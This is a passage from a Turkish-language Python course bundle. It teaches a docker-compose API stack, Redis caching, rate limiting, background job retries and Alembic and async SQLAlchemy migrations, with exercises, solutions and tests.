    healthcheck: {test: ["CMD", "redis-cli", "ping"], interval: 5s}
  migrate:
    build: .
    command: alembic upgrade head
    environment: &amp;ortam
      DATABASE_URL: postgresql+psycopg://market:$\{DB_SIFRE}@db/market
      REDIS_URL: redis://redis:6379/0
    depends_on: {db: {condition: service_healthy}}
  api:
    build: .
    command: uvicorn market.app:app --host 0.0.0.0 --port 8000
    environment: *ortam
    ports: ["8000:8000"]
    depends_on:
      migrate: {condition: service_completed_successfully}
      redis: {condition: service_healthy}
  worker:
    build: .
    command: python -m market.worker
    environment: *ortam
    depends_on:
      migrate: {condition: service_completed_successfully}
      redis: {condition: service_healthy}
volumes:
  pgdata:</pre>
<p><code>service_completed_successfully</code> sayesinde API, migration bitmeden başlamaz; birden çok API kopyası aynı anda migration çalıştırmaya kalkmaz. <code>&amp;ortam</code> / <code>*ortam</code> YAML çapası, ortam değişkenlerini tek yerde tanımlar. <code>$\{DB_SIFRE}</code> depoya girmeyen <code>.env</code> dosyasından gelir.</p>
<h2>Önbellek: önce Redis'e bak</h2>
<p>Ürün listesi sık okunur, seyrek değişir: önbellek kalıbı (cache-aside) için ideal. Okurken önce Redis'e bak, yoksa veritabanından oku ve süreli (TTL) yaz; ürün güncellenince anahtarı sil.</p>
<pre class="code">async def urunleri_getir(kategori: str) -&gt; list[dict]:
    anahtar = f"urunler:{kategori}:v1"
    if (hazir := await redis.get(anahtar)) is not None:
        return json.loads(hazir)
    urunler = await depo.kategoriye_gore(kategori)
    await redis.set(anahtar, json.dumps(urunler), ex=300)     # 5 dakika
    return urunler

async def urun_guncelle(urun_id, alanlar):
    urun = await depo.guncelle(urun_id, alanlar)
    await redis.delete(f"urunler:{urun.kategori}:v1")         # geçersiz kıl
    return urun</pre>
<h2>Arka plan işi: onay e-postası isteği bekletmesin</h2>
<p>Sipariş oluşturan istek, SMTP sunucusunun 2 saniyelik yanıtını beklememeli. Uç nokta siparişi kaydedip kuyruğa bir iş bırakır ve hemen 201 döner; <code>worker</code> işi alıp e-postayı gönderir, başarısız olursa artan aralıklarla yeniden dener. İş, siparişle <b>aynı transaction'da</b> bir "giden kutusu" (outbox) tablosuna yazılırsa sipariş kaydedilip iş kaybolamaz.</p>
<pre class="code"># market/worker.py  (RQ ile; Celery ya da arq da olur)
from redis import Redis
from rq import Worker, Queue
Worker([Queue("eposta", connection=Redis.from_url(REDIS_URL))]).work()

# uç noktada
kuyruk.enqueue("market.isler.onay_epostasi", siparis.id, retry=Retry(max=3, interval=[10, 60, 300]))</pre>
<h2>Hız sınırı</h2>
<p>Giriş ve sipariş uç noktaları kaba kuvvete ve kötüye kullanıma açıktır. En yaygın iki algoritma: <b>sabit pencere</b> (her dakika için bir sayaç: <code>INCR</code> + <code>EXPIRE</code>; basit ama pencere sınırında iki kat patlamaya izin verir) ve <b>jeton kovası</b> (token bucket: kova saniyede r jetonla dolar, en fazla b jeton tutar; her istek bir jeton harcar; kısa patlamalara izin verip ortalamayı sınırlar). Sınır aşılınca <b>429 Too Many Requests</b> ve <code>Retry-After</code> başlığı dönülür. Anahtar olarak giriş yapmış kullanıcının kimliği, yoksa istemci IP'si kullanılır (Nginx arkasında <code>X-Forwarded-For</code>'a dikkat). Redis'te tutmak, birden çok API kopyasının aynı sayacı paylaşmasını sağlar.</p>
<pre class="py">import time

class JetonKovasi:
    def __init__(self, hiz, kapasite, saat=time.monotonic):
        self.hiz, self.kapasite, self.saat = hiz, kapasite, saat
        self.durum = {}                            # anahtar -&gt; (jeton, son_zaman)

    def izin(self, anahtar):
        simdi = self.saat()
        jeton, son = self.durum.get(anahtar, (self.kapasite, simdi))
        jeton = min(self.kapasite, jeton + (simdi - son) * self.hiz)
        if jeton &gt;= 1:
            self.durum[anahtar] = (jeton - 1, simdi)
            return True, 0.0
        self.durum[anahtar] = (jeton, simdi)
        return False, round((1 - jeton) / self.hiz, 2)    # Retry-After (sn)

zaman = [0.0]
kova = JetonKovasi(hiz=1, kapasite=3, saat=lambda: zaman[0])
for t in [0, 0, 0, 0, 0.5, 1.2, 5]:
    zaman[0] = t
    print(t, kova.izin("ip:10.0.0.7"))</pre>
<div class="note"><b>Kendi bilgisayarında dene</b><code>docker compose up --build</code> ile tüm yığını başlat; <code>docker compose logs -f worker</code> ile e-posta işini izle. E-postayı gerçekten göndermemek için compose'a <code>mailpit</code> servisini ekleyip SMTP adresini ona yönlendir; gönderilen postaları tarayıcıda görürsün. Hız sınırını <code>for i in $(seq 20); do curl -s -o /dev/null -w "%{http_code}\\n" localhost:8000/giris; done</code> ile dene.</div>
<div class="note"><b>Gerçek işte</b>README'de bu mimarinin bir şeması, "tek komutla çalıştır" talimatı ve her bileşenin neden orada olduğunu açıklayan birer cümle, portföy projesini sıradan bir CRUD örneğinden ayırır. Mülakatta "Redis çökerse ne olur?" sorusuna hazır ol: önbellek atlanır (veritabanından okunur), hız sınırı ya gevşek moda geçer ya da istekleri reddeder; bu bir tasarım kararıdır.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'proje-api-y1',
        stage: 'Isınma',
        q: 'compose\'da <code>api</code> servisi <code>migrate: {condition: service_completed_successfully}</code> ile bekliyor. Bunun kazancı nedir?',
        o: [
          'API, gelen ilk istekte migration\'ı kendisi çalıştırır',
          'Şema güncellenmeden API başlamaz; migration bir kez çalışır',
          'Migration başarısız olsa bile API eski şemayla açılmaya devam eder',
          'Veritabanı için ayrıca sağlık kontrolü yazmak gereksiz hâle gelir'
        ],
        a: 1,
        why: 'migrate servisi bir kez çalışıp çıkar; API yalnız o başarıyla bitince başlar. API kopyalarının her biri başlarken migration çalıştırsaydı aynı anda yarışırlardı. Migration başarısız olursa API hiç başlamaz; bu, yanlış şemayla çalışmaktan iyidir.'
      },
      {
        t: 'mc',
        id: 'proje-api-y2',
        stage: 'Isınma',
        q: 'Sabit pencereli hız sınırı (dakikada 100 istek) için hangisi doğru bir eleştiridir?',
        o: [
          'Redis olmadan hiçbir şekilde uygulanamaz, bellekte çalışmaz',
          'Pencere sınırında iki saniyede 200 istek geçebilir',
          'Her istek için tüm zaman damgası geçmişini saklamak gerekir',
          'Kullanıcı başına değil yalnızca tüm sistem için uygulanabilir'
        ],
        a: 1,
        why: 'Sabit pencere sayaç sınırında sıfırlanır; iki pencerenin kenarında sınırın iki katı kısa sürede geçebilir. Kayan pencere ya da jeton kovası bunu yumuşatır. Sabit pencere ise bellekte de uygulanabilir ve tüm geçmişi değil yalnız bir sayaç tutar.'
      },
      {
        t: 'predict',
        id: 'proje-api-y3',
        stage: 'Kodu oku',
        q: 'Jeton kovası (hız 1/sn, kapasite 2): bu kod ne yazdırır?',
        o: ['✓✓✗✗✓✗✓✓✗', '✓✓✗✓✓✗✓✓✓', '✓✓✓✗✓✗✓✓✗', '✓✓✗✗✓✓✓✓✗'],
        a: 0,
        code: 'class Kova:\n    def __init__(self, hiz, kap):\n        self.hiz, self.kap, self.jeton, self.son = hiz, kap, kap, 0.0\n    def izin(self, t):\n        self.jeton = min(self.kap, self.jeton + (t - self.son) * self.hiz)\n        self.son = t\n        if self.jeton >= 1:\n            self.jeton -= 1\n            return "✓"\n        return "✗"\n\nk = Kova(1, 2)\nprint("".join(k.izin(t) for t in [0, 0, 0, 0.5, 1.0, 1.0, 4.0, 4.0, 4.0]))\n',
        why: 'Kova 2 jetonla başlar: ilk iki istek geçer, üçüncü reddedilir. 0,5 sn\'de yarım jeton vardır (geçmez); 1,0\'da bir tam jeton olur, biri geçer, aynı andaki ikinci geçmez. 4,0\'da kova kapasiteye (2) dolmuştur: iki geçer, üçüncü reddedilir. Kapasite, patlamanın üst sınırıdır.'
      },
      {
        t: 'order',
        id: 'proje-api-y4',
        stage: 'Kodu oku',
        q: '<p>Önbellek kalıbını (cache-aside) sözlükle taklit eden programı sırala: ilk çağrı veritabanına gider, ikinci önbellekten gelir. Beklenen çıktı:</p><pre class="out">db 1\nönbellek 1</pre>',
        lines: [
          'onbellek, db_okuma = {}, [0]',
          'def urunler(kategori):',
          '    if kategori in onbellek:',
          '        return "önbellek", db_okuma[0]',
          '    db_okuma[0] += 1',
          '    onbellek[kategori] = ["Termos", "Yoga Matı"]',
          '    return "db", db_okuma[0]',
          'ilk = urunler("Spor")',
          'print(*ilk)',
          'print(*urunler("Spor"))'
        ],
        expect: 'db 1\nönbellek 1\n',
        hint: 'Önbellek kontrolü fonksiyonun ilk işidir; veritabanı okuması yalnız ıska (miss) durumunda olur.',
        why: 'Cache-aside\'da uygulama önce önbelleğe bakar; ıskada kaynaktan okur ve önbelleğe yazar. Gerçek sistemde yazarken TTL verilir ve veri değişince anahtar silinir.'
      },
      {
        t: 'code',
        id: 'proje-api-y5',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Sabit pencereli hız sınırlayıcı yaz: <code>SabitPencere(limit, pencere_sn, saat)</code>, <code>izin(anahtar)</code> metodu <code>(izinli, kalan, retry_after)</code> döndürsün. Pencere numarası <code>int(saat() // pencere_sn)</code>; sayaç <code>(anahtar, pencere_no)</code> için tutulur (Redis\'teki <code>INCR oran:&lt;anahtar&gt;:&lt;no&gt;</code> gibi). İzinliyse <code>kalan = limit - sayac</code>, <code>retry_after = 0</code>; değilse <code>kalan = 0</code> ve <code>retry_after</code> pencerenin bitmesine kalan tam saniye (yukarı yuvarlanmış). Eski pencerelerin sayaçlarını sil ki bellek büyümesin.</p>',
        guide: [
          'saat() ile şimdiki zamanı, // ile pencere numarasını hesapla.',
          'Sayaç sözlüğünde (anahtar, no) değerini 1 artır; eski numaralı girdileri temizle.',
          'sayac <= limit ise izinli.',
          'Değilse retry_after = ceil((no + 1) * pencere_sn - simdi).'
        ],
        example: 'import math\nsimdi, pencere = 125.3, 60\nno = int(simdi // pencere)\nprint(no, math.ceil((no + 1) * pencere - simdi))\n',
        start: 'import math\n\nclass SabitPencere:\n    def __init__(self, limit, pencere_sn, saat):\n        self.limit, self.pencere, self.saat = limit, pencere_sn, saat\n        self.sayac = {}\n\n    def izin(self, anahtar):\n        simdi = self.saat()\n        no = int(simdi // self.pencere)\n        # TODO: eski pencereleri sil, sayacı artır\n        # TODO: izin ve retry_after\n        return True, self.limit, 0\n',
        sol: 'import math\n\nclass SabitPencere:\n    def __init__(self, limit, pencere_sn, saat):\n        self.limit, self.pencere, self.saat = limit, pencere_sn, saat\n        self.sayac = {}\n\n    def izin(self, anahtar):\n        simdi = self.saat()\n        no = int(simdi // self.pencere)\n        for k in [k for k in self.sayac if k[1] < no]:\n            del self.sayac[k]\n        n = self.sayac.get((anahtar, no), 0) + 1\n        self.sayac[(anahtar, no)] = n\n        if n <= self.limit:\n            return True, self.limit - n, 0\n        return False, 0, math.ceil((no + 1) * self.pencere - simdi)\n',
        tests: 't = [0.0]\ns = SabitPencere(3, 60, lambda: t[0])\nt[0] = 10\nassert [s.izin("ip:1") for _ in range(4)] == [(True, 2, 0), (True, 1, 0), (True, 0, 0), (False, 0, 50)], "4. istek reddedilmeli, pencere 50 sn sonra biter"\nassert s.izin("ip:2") == (True, 2, 0), "Başka anahtarın sayacı ayrı"\nt[0] = 59.5\nassert s.izin("ip:1")[2] == 1, "Kalan 0,5 sn yukarı yuvarlanır: 1"\nt[0] = 60\nassert s.izin("ip:1") == (True, 2, 0), "Yeni pencerede sayaç sıfırlanır"\nassert all(k[1] == 1 for k in s.sayac), "Eski pencere sayaçları silinmiş olmalı"\n',
        hints: [
          'Sayaç anahtarı (anahtar, pencere_no) demetidir.',
          'Temizlik: no\'dan küçük pencere numaralı anahtarları listeye alıp sil (gezerken sözlüğü değiştirme).',
          'retry_after = math.ceil((no + 1) * self.pencere - simdi)'
        ],
        why: 'Redis\'te bu kalıp INCR + EXPIRE ile iki komuttur ve tüm API kopyaları aynı sayacı paylaşır. Eski pencereleri silmek Redis\'te EXPIRE\'ın işidir; bellekte ise senin sorumluluğundadır. Saat fonksiyonunu dışarıdan almak testleri deterministik yapar.'
      },
      {
        t: 'code',
        id: 'proje-api-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Hız sınırını bir uç nokta sarmalayıcısına bağla: <code>sinirla(sinirlayici, isleyici)</code> bir fonksiyon döndürsün; dönen fonksiyon <code>istek</code> sözlüğü alır (<code>{"kullanici": str | None, "ip": str, ...}</code>). Anahtar: kullanıcı varsa <code>"k:" + kullanici</code>, yoksa <code>"ip:" + ip</code>. İzin varsa <code>isleyici(istek)</code>\'in döndürdüğü <code>(durum, govde, basliklar)</code> yanıtına <code>X-RateLimit-Remaining</code> başlığını (metin) ekle; izin yoksa <code>(429, {"hata": "çok fazla istek"}, {"Retry-After": "&lt;sn&gt;", "X-RateLimit-Remaining": "0"})</code> döndür ve işleyiciyi çağırma. Sınırlayıcı önceki görevdeki arayüze sahip: <code>izin(anahtar) -&gt; (izinli, kalan, retry_after)</code>.</p>',
        start: 'def sinirla(sinirlayici, isleyici):\n    pass\n',
        sol: 'def sinirla(sinirlayici, isleyici):\n    def sarmal(istek):\n        anahtar = "k:" + istek["kullanici"] if istek.get("kullanici") else "ip:" + istek["ip"]\n        izinli, kalan, sonra = sinirlayici.izin(anahtar)\n        if not izinli:\n            return 429, {"hata": "çok fazla istek"}, {"Retry-After": str(sonra), "X-RateLimit-Remaining": "0"}\n        durum, govde, basliklar = isleyici(istek)\n        return durum, govde, {**basliklar, "X-RateLimit-Remaining": str(kalan)}\n    return sarmal\n',
        tests: 'class Sahte:\n    def __init__(self):\n        self.say = {}\n    def izin(self, a):\n        self.say[a] = self.say.get(a, 0) + 1\n        return (True, 2 - self.say[a], 0) if self.say[a] <= 2 else (False, 0, 30)\ncagri = []\ndef giris(istek):\n    cagri.append(istek["ip"])\n    return 200, {"ok": True}, {"Content-Type": "application/json"}\nuc = sinirla(Sahte(), giris)\nassert uc({"kullanici": None, "ip": "10.0.0.7"}) == (200, {"ok": True}, {"Content-Type": "application/json", "X-RateLimit-Remaining": "1"}), "İlk istek geçer, kalan başlığı eklenir"\nuc({"kullanici": None, "ip": "10.0.0.7"})\nassert uc({"kullanici": None, "ip": "10.0.0.7"}) == (429, {"hata": "çok fazla istek"}, {"Retry-After": "30", "X-RateLimit-Remaining": "0"}), "Üçüncü istek 429"\nassert len(cagri) == 2, "429 durumunda işleyici çağrılmamalı"\nassert uc({"kullanici": "ece", "ip": "10.0.0.7"})[0] == 200, "Giriş yapmış kullanıcı kendi anahtarıyla sınırlanır"\n',
        hints: ['Bir iç fonksiyon tanımla ve onu döndür (kapanış).', 'Anahtar seçimi: istek.get("kullanici") doluysa kullanıcı, değilse IP.', 'Başlık değerleri HTTP\'de metindir: str(kalan).'],
        why: 'Hız sınırını iş mantığından ayırıp sarmalayıcıya (FastAPI\'de middleware ya da bağımlılık) koymak, her uç noktaya aynı kuralı tek satırla uygulatır. Retry-After başlığı istemcinin ne kadar bekleyeceğini bilmesini sağlar; iyi istemciler buna uyar.'
      },
      {
        t: 'code',
        id: 'proje-api-y7',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>Katalog</code> sınıfı ürünleri önbellekle sunuyor. Fiyat güncellendikten sonra API saatlerce eski fiyatı gösteriyor ve önbellekteki listeyi değiştiren bir çağıran tüm kullanıcıları etkiliyor. İki düzeltme: güncellemede ilgili kategori anahtarını sil; önbelleğe ve önbellekten <b>kopya</b> ver (Redis\'teki JSON gibi).</p>',
        start: 'class Katalog:\n    def __init__(self, db):\n        self.db = db                 # {urun_id: {"ad", "kategori", "fiyat"}}\n        self.onbellek = {}\n        self.db_okuma = 0\n\n    def kategori(self, k):\n        if k not in self.onbellek:\n            self.db_okuma += 1\n            self.onbellek[k] = [u for u in self.db.values() if u["kategori"] == k]\n        return self.onbellek[k]\n\n    def fiyat_guncelle(self, urun_id, fiyat):\n        self.db[urun_id] = {**self.db[urun_id], "fiyat": fiyat}\n',
        sol: 'import copy\n\nclass Katalog:\n    def __init__(self, db):\n        self.db = db\n        self.onbellek = {}\n        self.db_okuma = 0\n\n    def kategori(self, k):\n        if k not in self.onbellek:\n            self.db_okuma += 1\n            self.onbellek[k] = copy.deepcopy([u for u in self.db.values() if u["kategori"] == k])\n        return copy.deepcopy(self.onbellek[k])\n\n    def fiyat_guncelle(self, urun_id, fiyat):\n        self.db[urun_id] = {**self.db[urun_id], "fiyat": fiyat}\n        self.onbellek.pop(self.db[urun_id]["kategori"], None)\n',
        tests: 'k = Katalog({1: {"ad": "Termos", "kategori": "Spor", "fiyat": 459}, 2: {"ad": "Suç ve Ceza", "kategori": "Kitap", "fiyat": 145}})\nk.kategori("Spor"); k.kategori("Spor")\nassert k.db_okuma == 1, "İkinci okuma önbellekten gelmeli"\nliste = k.kategori("Spor")\nliste[0]["fiyat"] = 1\nliste.append({"ad": "sahte"})\nassert k.kategori("Spor") == [{"ad": "Termos", "kategori": "Spor", "fiyat": 459}], "Çağıranın değişikliği önbelleği bozmamalı"\nk.kategori("Kitap")\nk.fiyat_guncelle(1, 399)\nassert k.kategori("Spor")[0]["fiyat"] == 399, "Güncellemeden sonra yeni fiyat görülmeli"\nassert k.db_okuma == 3, "Yalnız Spor anahtarı silinmeli; Kitap önbellekte kalmalı"\nk.kategori("Kitap")\nassert k.db_okuma == 3, "Kitap kategorisi hâlâ önbellekten gelmeli"\n',
        hints: ['İki ayrı sorun: geçersiz kılma yok ve aynı liste nesnesi paylaşılıyor.', 'Güncellemede onbellek.pop(kategori, None).', 'copy.deepcopy ile hem yazarken hem okurken kopya ver.'],
        why: 'Önbellekte en sık iki hata, değişikliğin önbelleği geçersiz kılmaması (bayat veri) ve bellek içi önbellekte paylaşılan değişebilir nesnelerdir. Redis\'te veri JSON olarak saklandığı için ikincisi doğal olarak çözülür; Python içi önbellekte (functools.lru_cache dahil) ise senin sorumluluğundadır.'
      },
      {
        t: 'code',
        id: 'proje-api-y8',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Arka plan işçisini yeniden deneme ile simüle et: <code>isci_calistir(isler, gonder, gecikmeler=(10, 60, 300))</code>. <code>isler</code> <code>(zaman, is_id)</code> listesidir (kuyruğa giriş zamanı). <code>gonder(is_id, deneme)</code> başarılıysa <code>True</code>, değilse <code>False</code> döner (deneme 1\'den başlar). Başarısız iş, <code>gecikmeler[deneme-1]</code> saniye sonra yeniden kuyruğa girer; gecikmeler bitince iş "ölü" kuyruğa (dead letter) gider. İşçi işleri her zaman <b>en erken zamanlı</b> olandan (eşitlikte is_id küçük olandan) işler. <code>{"basarili": [(is_id, zaman, deneme), ...], "olu": [is_id, ...]}</code> döndür (oluş sırasıyla).</p>',
        start: 'import heapq\n\ndef isci_calistir(isler, gonder, gecikmeler=(10, 60, 300)):\n    return {"basarili": [], "olu": []}\n',
        sol: 'import heapq\n\ndef isci_calistir(isler, gonder, gecikmeler=(10, 60, 300)):\n    kuyruk = [(z, i, 1) for z, i in isler]\n    heapq.heapify(kuyruk)\n    sonuc = {"basarili": [], "olu": []}\n    while kuyruk:\n        z, i, d = heapq.heappop(kuyruk)\n        if gonder(i, d):\n            sonuc["basarili"].append((i, z, d))\n        elif d <= len(gecikmeler):\n            heapq.heappush(kuyruk, (z + gecikmeler[d - 1], i, d + 1))\n        else:\n            sonuc["olu"].append(i)\n    return sonuc\n',
        tests: 'hata_sayisi = {101: 1, 102: 0, 103: 9, 104: 2}\ndef gonder(i, d):\n    return d > hata_sayisi[i]\nr = isci_calistir([(0, 101), (0, 102), (5, 103), (20, 104)], gonder)\nassert r["basarili"] == [(102, 0, 1), (101, 10, 2), (104, 90, 3)], f"Başarılar: {r[\'basarili\']}"\nassert r["olu"] == [103], "103 dört denemede de başarısız: ölü kuyruğa"\nassert isci_calistir([], gonder) == {"basarili": [], "olu": []}, "Boş kuyruk"\nr2 = isci_calistir([(0, 7)], lambda i, d: False, gecikmeler=())\nassert r2 == {"basarili": [], "olu": [7]}, "Yeniden deneme yoksa ilk hatada ölü"\n',
        hints: [
          'Öncelik kuyruğu: heapq ile (zaman, is_id, deneme) demetleri; en küçük önce çıkar.',
          'Başarısızlıkta deneme <= len(gecikmeler) ise yeni zamanla geri koy.',
          '104: 20\'de ilk deneme, +10 → 30\'da ikinci, +60 → 90\'da üçüncü (başarılı).'
        ],
        why: 'RQ, Celery ve arq\'ın yeniden deneme mantığı budur: artan gecikmeler geçici hataları (SMTP yoğunluğu) atlatır, sınırlı deneme sayısı kalıcı hataları (geçersiz adres) sonsuz döngüden kurtarır. Ölü kuyruk, elle incelenecek işlerin kaybolmamasını sağlar.'
      }
    ],
    faq: [
      {
        q: 'Celery mi, RQ mu, arq mı?',
        a: 'RQ en basitidir: Redis ve sıradan Python fonksiyonları. arq async (FastAPI ile doğal). Celery en kapsamlısıdır: zamanlanmış görevler, iş akışları, RabbitMQ desteği; ama yapılandırması ağırdır. Portföy projesinde RQ ya da arq yeterlidir; mülakatta seçimi gerekçelendirebilmek önemlidir.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'sqlalchemy-orm' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'sqlalchemy-orm',
    min: 25,
    needs: ['sqlite3'],
    html: `<p>Derste Alembic'i yalnız komutlarıyla gördün ve async'e bir paragrafla değindik. Bu bölüm ikisini de gerçek iş akışına taşıyor: bir migration dosyasının içi, veri taşıyan migration, canlı sistemde kesintisiz şema değişikliği ve FastAPI gibi async çatılarda SQLAlchemy.</p>
<h2>Bir migration dosyasının anatomisi</h2>
<p><code>alembic revision --autogenerate -m "musteriye telefon ekle"</code> komutu <code>migrations/versions/</code> altında bir Python dosyası üretir. Alembic sürümleri bir <b>zincir</b> olarak tutar: her dosya kendi kimliğini (<code>revision</code>) ve bir öncekini (<code>down_revision</code>) bilir. Veritabanında ise <code>alembic_version</code> adlı tek satırlık bir tablo, şemanın şu an hangi halkada olduğunu saklar.</p>
<pre class="code">"""musteriye telefon ekle"""
from alembic import op
import sqlalchemy as sa

revision = "b7c2e1"
down_revision = "a41f09"      # bir önceki halka; ilk migration'da None

def upgrade() -&gt; None:
    op.add_column("musteri", sa.Column("telefon", sa.String(20), nullable=True))
    op.create_index("ix_musteri_telefon", "musteri", ["telefon"])

def downgrade() -&gt; None:
    op.drop_index("ix_musteri_telefon", table_name="musteri")
    op.drop_column("musteri", "telefon")</pre>
<p>Günlük akış şöyledir: modeli değiştir, <code>revision --autogenerate</code> çalıştır, üretilen dosyayı <b>satır satır oku</b> (autogenerate bir taslaktır), yerelde <code>upgrade head</code> ve hemen ardından <code>downgrade -1</code> ile geri alınabildiğini dene, dosyayı modelle aynı commit'e koy. CI'da boş bir veritabanına <code>alembic upgrade head</code> çalıştırmak, zincirin kırılmadığını kanıtlar. İki geliştirici aynı halkadan dal açarsa "iki head" oluşur; <code>alembic heads</code> bunu gösterir, <code>alembic merge</code> ile birleştirilir.</p>
<div class="tbl-wrap"><table><tr><th>autogenerate şunu yakalar</th><th>Şunu yakalamaz ya da yanlış anlar</th></tr>
<tr><td>Tablo ve sütun ekleme/silme</td><td>Sütun yeniden adlandırma (sil + ekle sanır, veri gider)</td></tr>
<tr><td>nullable değişikliği, indeks, yabancı anahtar</td><td>Tablo adı değişikliği, CHECK kısıtlarının çoğu</td></tr>
<tr><td>Sütun türü (<code>compare_type</code> açıksa)</td><td>Veri dönüşümü: eski değerleri yeni sütuna taşımak</td></tr></table></div>
<h2>Veri migration'ı</h2>
<p>Şema değişikliği bazen veriyi de taşımayı gerektirir: <code>ad_soyad</code> sütununu <code>ad</code> ve <code>soyad</code>'a bölmek, şehir adından şehir kodu türetmek gibi. Bunu migration içinde <code>op.execute</code> ile SQL olarak yaz; ORM modellerini import etme, çünkü model ileride değişir ve eski migration bozulur. Büyük tablolarda tek dev <code>UPDATE</code> yerine parti parti güncelle ki kilitler kısa sürsün. SQLite <code>ALTER TABLE</code> desteği sınırlı olduğundan Alembic orada <code>op.batch_alter_table</code> ile tabloyu yeniden kurar.</p>
<p>Aşağıdaki çalıştırılabilir örnek Alembic'in yaptığını sqlite3 ile taklit ediyor: sürüm tablosu, sırayla uygulanan halkalar ve bir veri migration'ı. Veri, Anadolu Market'in gerçek <code>customers</code> tablosu.</p>
<pre class="py">import veri
conn = veri.baglan("anadolu_market", tablolar=["customers"])
conn.execute("CREATE TABLE alembic_version (version_num TEXT)")
conn.execute("INSERT INTO alembic_version VALUES ('base')")

KODLAR = {"İstanbul": 34, "Ankara": 6, "İzmir": 35, "Bursa": 16}

def m001_upgrade(c):
    c.execute("ALTER TABLE customers ADD COLUMN plaka INTEGER")    # 1) boş (nullable) sütun

def m002_upgrade(c):                                              # 2) veri migration'ı
    for sehir, kod in KODLAR.items():
        c.execute("UPDATE customers SET plaka = ? WHERE city = ?", (kod, sehir))

zincir = [("m001", m001_upgrade), ("m002", m002_upgrade)]
for rev, fn in zincir:
    with conn:                                   # her halka kendi transaction'ında
        fn(conn)
        conn.execute("UPDATE alembic_version SET version_num = ?", (rev,))

print(conn.execute("SELECT version_num FROM alembic_version").fetchone()[0])
print(conn.execute("SELECT plaka, COUNT(*) FROM customers GROUP BY plaka ORDER BY plaka").fetchall())</pre>
<p><code>None</code> grubu, kodu tabloda olmayan şehirleri ve şehri boş müşterileri gösteriyor. Gerçek migration'da bu sayıyı loglar, sıfır değilse kararı veri sahibine bırakırsın.</p>
<h2>Sıfır kesintili migration: genişlet ve daralt</h2>
<p>Canlıda dağıtım sırasında eski ve yeni kod bir süre <b>aynı anda</b> çalışır (sırayla güncellenen konteynerler). Bu yüzden her şema değişikliği hem eski hem yeni kodla uyumlu olmalı. Kalıbın adı genişlet ve daralt (expand and contract):</p>
<div class="steps-list"><ol>
<li><b>Genişlet:</b> yeni sütunu nullable ya da varsayılanlı ekle. Eski kod onu görmez, bozulmaz.</li>
<li><b>Çift yaz:</b> yeni kod hem eski hem yeni sütuna yazar.</li>
<li><b>Geri doldur (backfill):</b> eski satırları partiler hâlinde doldur.</li>
<li><b>Geçiş:</b> okumalar yeni sütuna geçer; doğrulama yap.</li>
<li><b>Daralt:</b> ayrı bir sürümde NOT NULL ekle, eski sütunu sil.</li>
</ol></div>
<div class="warn"><b>Tek adımda yeniden adlandırma</b><code>ALTER TABLE ... RENAME COLUMN</code> şemayı bir anda değiştirir; o sırada çalışan eski kod eski adı arar ve hata verir. Kesinti istemiyorsan yeniden adlandırmayı yukarıdaki beş adıma böl. PostgreSQL'de büyük tabloya indeks eklerken de <code>CREATE INDEX CONCURRENTLY</code> kullan (Alembic'te <code>postgresql_concurrently=True</code>, transaction dışında).</div>
<h2>Async SQLAlchemy</h2>
<p>FastAPI gibi async çatılarda veritabanı çağrısı beklenirken olay döngüsü başka istekleri işleyebilsin diye async sürücü kullanılır: PostgreSQL için <code>asyncpg</code>, SQLite için <code>aiosqlite</code>. API, bildiğin 2.0 API'sinin <code>await</code>'li hâlidir.</p>
<pre class="code">from sqlalchemy import select
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker
from sqlalchemy.orm import selectinload

engine = create_async_engine("postgresql+asyncpg://app:gizli@db/market", pool_size=10)
Oturum = async_sessionmaker(engine, expire_on_commit=False)

async def musteri_siparisleri(musteri_id: int):
    async with Oturum() as s:
        sorgu = (select(Musteri)
                 .where(Musteri.id == musteri_id)
                 .options(selectinload(Musteri.siparisler)))   # tembel yükleme yok: önceden yükle
        m = (await s.execute(sorgu)).scalar_one()
        return [x.tutar for x in m.siparisler]

async def tablolari_kur():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)   # senkron API'yi async içinde çalıştır</pre>
<div class="note"><b>Kendi bilgisayarında dene</b><code>pip install "sqlalchemy[asyncio]" aiosqlite alembic</code> ile kur; adres olarak <code>sqlite+aiosqlite:///magaza.db</code> kullan. Tarayıcıda async sürücü yok; aşağıdaki alıştırmalar kalıbı asyncio ve sahte oturumla çalıştırıyor.</div>
<p>Üç kural akılda kalsın. Bir: <code>AsyncSession</code> eşzamanlı görevler arasında <b>paylaşılmaz</b>; <code>asyncio.gather</code> ile paralel sorgu atacaksan her göreve ayrı oturum aç. İki: async'te tembel yükleme <code>MissingGreenlet</code> hatası verir; ilişkileri <code>selectinload</code> ile önceden yükle. Üç: <code>expire_on_commit=False</code> vermezsen commit sonrası özniteliğe erişmek gizli bir sorgu tetikler ve yine aynı hataya düşersin.</p>
<div class="note"><b>Gerçek işte</b>Ekiplerde migration dosyası kod incelemesinin en dikkatli bakılan parçasıdır. İncelemede sorulan sorular hep aynıdır: downgrade gerçekten çalışıyor mu, büyük tabloyu kilitler mi, eski kod bu şemayla çalışmaya devam eder mi, veri kaybı var mı?</div>`,
    ex: [
      {
        t: 'mc',
        id: 'sqlalchemy-orm-y1',
        stage: 'Isınma',
        q: 'Modelde <code>ad</code> sütununun adını <code>tam_ad</code> yaptın ve <code>alembic revision --autogenerate</code> çalıştırdın. Üretilen dosyada büyük olasılıkla ne görürsün?',
        o: [
          'Tek bir <code>op.alter_column(..., new_column_name=...)</code> satırı',
          '<code>ad</code> sütununu silen ve <code>tam_ad</code> ekleyen iki işlem',
          'Hiçbir işlem; autogenerate ad değişikliğini görmez',
          'Tabloyu silip yeniden oluşturan tek bir <code>op.drop_table</code>'
        ],
        a: 1,
        why: 'Autogenerate yalnız modeli şemayla karşılaştırır; adı değişen sütunu "biri gitmiş, biri gelmiş" diye yorumlar. Dosyayı olduğu gibi uygularsan ad sütunundaki veri kaybolur. Elle op.alter_column ile düzeltmen ya da genişlet-daralt kalıbını uygulaman gerekir.'
      },
      {
        t: 'mc',
        id: 'sqlalchemy-orm-y2',
        stage: 'Isınma',
